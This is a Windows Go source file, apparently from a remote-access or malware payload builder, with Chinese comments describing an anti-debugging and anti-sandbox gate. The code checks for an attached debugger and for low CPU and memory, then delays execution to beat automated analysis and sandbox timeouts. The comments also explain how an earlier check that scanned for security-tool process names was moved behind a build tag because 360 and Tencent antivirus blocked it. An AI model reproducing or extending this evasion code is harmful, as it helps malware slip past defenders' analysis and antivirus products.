//go:build windows

package main

import (
	"runtime"
	"time"
	"unsafe"
)

// 反沙箱/反调试（仅 Windows）：
// 命中调试器或典型低配资源环境时，延迟执行一段时间后再继续，干扰自动化分析
// 与沙箱超时判定。策略为"延迟"而非"退出"，避免误伤正常主机。
// 敏感 API 名由服务端编译期混淆为 xd("hex")，二进制无明文。
//
// ⚠️ v1.3.4 起**默认不做任何进程枚举**：
// 原实现是"CreateToolhelp32Snapshot 遍历全部进程名 → 与 38 个安全软件/分析工具
// 特征比对"，这是国产杀软主动防御**明确拦截**的对抗行为：实测在装有 360/电脑管家
// 的主机上，带该逻辑的载荷一启动即 `Access is denied`（进程创建被拒）且文件被删除；
// 同时它必须静态导入 toolhelp32 API 并携带一批安全软件进程名，绕过了 apihash
// 免杀路径，属于"为了弱反沙箱能力付出强行为特征"的亏本买卖。
//
// 现在该逻辑移入 gate_scan_windows.go，**只有构建时显式带 evasionscan 标签**
// （生成载荷页的"主动反沙箱进程检测"选项）才参与编译，默认载荷里连字符串都不存在。
func initGate() {
	delay := time.Duration(0)

	// 1. 反调试：IsDebuggerPresent（单次调用，无枚举行为）
	isDbg := resolveAPI("kernel32.dll", "IsDebuggerPresent")
	if err := isDbg.Find(); err == nil {
		if r, _, _ := isDbg.Call(); r != 0 {
			delay += 3 * time.Second
		}
	}

	// 2. 安全软件/沙箱进程特征：默认关闭（空实现），带 evasionscan 标签才有真实逻辑。
	delay += hostDelay()

	// 3. 资源特征：CPU < 2 核或物理内存 < 2GB（典型沙箱低配配置）
	if runtime.NumCPU() < 2 {
		delay += 3 * time.Second
	}
	gms := resolveAPI("kernel32.dll", "GlobalMemoryStatusEx")
	if err := gms.Find(); err == nil {
		m := &memoryStatusEx{Length: uint32(unsafe.Sizeof(memoryStatusEx{}))}
		if r, _, _ := gms.Call(uintptr(unsafe.Pointer(m))); r != 0 && m.TotalPhys > 0 && m.TotalPhys < 2*1024*1024*1024 {
			delay += 3 * time.Second
		}
	}

	// 4. 随机运行延迟：0~3s，打乱自动化/行为沙箱对"启动即连/即行为"的判定节奏。
	//    仅当检测到上述分析/安全特征时才叠加随机延迟；正常主机不额外延时。
	//    启动随机延迟由配置 startup_delay_min/max 主导，这里只加少量扰动。
	if delay > 0 {
		delay += time.Duration(time.Now().UnixNano()%3000) * time.Millisecond
		time.Sleep(delay)
	}
}

type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}
